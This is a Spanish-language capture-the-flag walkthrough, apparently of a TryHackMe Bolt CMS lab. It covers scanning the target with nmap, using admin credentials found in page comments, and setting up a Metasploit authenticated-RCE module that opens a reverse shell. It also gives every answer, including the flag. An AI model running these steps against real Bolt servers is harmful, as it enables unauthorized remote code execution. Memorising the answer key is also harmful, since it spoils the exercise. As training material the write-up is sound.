# 1) Objetivo

En esta máquina de pentesting web, debemos ir respondiendo a las preguntas que se nos plantean, consiguiendo acceso a la máquina y buscando lo que nos solicitan.

# 2) Preguntas y procedimentos

## a) ¿Qué número de puerto tiene un servidor web con un CMS ejecutándose?

Lo primero que haremos, será realizar un nmap para conocer los puertos abiertos y los servicios que hay en estos, ejecutamos:

```
nmap -sV 10.10.192.108
```

![](IMG/Pasted%20image%2020250310111847.png)

Tenemos tres puertos abiertos, el 22 (SSH), el 80 (servidor web apache) y el 8000 con un servidor web PHP, por lo que el servidor web con cms está en el puerto 8000.

**Respuesta: 8000**
## b) ¿Cuál es el nombre de usuario que podemos encontrar en el CMS?

Si echamos un vistazo a la web, accediendo a 10.10.192.108:8000, veremos en los comentarios que se encuentran en la página principal, veremos que el nombre de usuario es bolt.

![](IMG/Pasted%20image%2020250310112414.png)

**Respuesta: bolt**

## c) ¿Cuál es la contraseña que podemos encontrar para el nombre de usuario?

Del mismo modo que antes, en los comentarios, se nos dice la contraseña.

![](IMG/Pasted%20image%2020250310112521.png)
**Respuesta: boltadmin123**

## d) ¿Qué versión del CMS está instalada en el servidor? (Ej: Nombre 1.1.1)

En la pagina principal, no encontramos nada que nos indique la versión instalada, así que haremos un listado de directorios para ver si encontramos algún panel de administración del cms en el que poder hacer login con las credenciales que tenemos.

Hemos lanzado dirbuster y feroxbuster, pero no nos estan dando muchos resultados y tardan bastante.

![](IMG/Pasted%20image%2020250310130205.png)

Así que mientras esperaba, se me ha ocurrido que como sabemos que el cms es bolt, podría realizar una consulta en internet para averiguar como puedo hacer login en dicho cms, y he encontrado que se accede a través del directorio /bolt.

![](IMG/Pasted%20image%2020250310130323.png)

Probamos, y vemos que efectivamente, podemos hacer login.

![](IMG/Pasted%20image%2020250310130528.png)

Una vez que hemos hecho login, podemos ver en la esquina inferior izquierda del dashboard, la versión del cms.

![](IMG/Pasted%20image%2020250310130824.png)

**Respuesta: Bolt 3.7.1**

## e) Existe un exploit para una versión anterior de este CMS, que permite el acceso remoto autenticado.  Encuéntrelo en Exploit DB. ¿Cuál es su EDB-ID?

Accedemos a la web de [Exploit DB](https://www.exploit-db.com/) y realizamos la búsqueda, en los resultados, vemos un exploit para Bolt cms 3.7.0, accedemos a el para ver los detalles.

![](IMG/Pasted%20image%2020250310131124.png)

Y encontramos el EDB-ID que nos piden.

![](IMG/Pasted%20image%2020250310131407.png)

**Respuesta: 48296**

## f) Metasploit agregó recientemente un módulo de explotación para esta vulnerabilidad. ¿Cuál es la ruta completa de esta explotación? (Por ejemplo: exploit/...)

Nota: Si no puede encontrar el módulo de explotación, lo más probable es que su metasploit no esté actualizado. Ejecute ` apt update` y luego ` apt install metasploit- framework`

Realizamos la búsqueda en metasploit, para lo que ejecutamos:

```
msfconsole
search bolt
```

Y encontramos el exploit al que se nos hace referencia.

![](IMG/Pasted%20image%2020250310131957.png)

**Respuesta: exploit/unix/webapp/bolt_authenticated_rce**

## g) Establezca LHOST, LPORT, RHOST, NOMBRE DE USUARIO, CONTRASEÑA  en msfconsole antes de ejecutar el exploit

Seleccionamos el exploit a usar, en nuestro caso, el 0.

```
use 0
```

![](IMG/Pasted%20image%2020250310132343.png)

Una vez seleccionado, configuraremos las opciones, para ello hacemos:

```
options
```

en nuestro caso, debemos aportar los datos para LHOST, LPORT, RHOST, nombre de usuario y contraseña. (cambiamos a terminator, porque fish no me deja hacer scroll).

![](IMG/Pasted%20image%2020250310132824.png)
![](IMG/Pasted%20image%2020250310132846.png)

Para configurar estos campos usamos:

```
set PASSWORD boltadmin123
set RHOSTS 10.10.192.108
set USERNAME bolt
set LHOST 10.8.16.0
(RPORT LO DEJAREMOS COMO ESTÁ)
```

![](IMG/Pasted%20image%2020250310133116.png)

Una vez configurado, lanzamos el exploit:

```
run
```

Nos da error, he comprobado y es porque la pagina maquina esta dando problemas, la terminamos e iniciamos otra (cambiará la ip).

![](IMG/Pasted%20image%2020250310140358.png)

intentamos de nuevo, repitiendo el proceso con la nueva ip de la máquina objetivo, y ahora sí funciona.

![](IMG/Pasted%20image%2020250310140754.png)

Y ya tendríamos iniciada una shell reversa, con la que podemos ver los directorios de la máquina.

**Respuesta: No aplica.**

## h) Busque flag.txt dentro de la máquina.

Ahora solo tendremos que ir navegando por los directorios hasta encontrar la flag.

![](IMG/Pasted%20image%2020250310140946.png)

que se encuentra en el directorio /home, la abrimos, y tendremos la respuesta.

![](IMG/Pasted%20image%2020250310141240.png)

**Respuesta: THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}**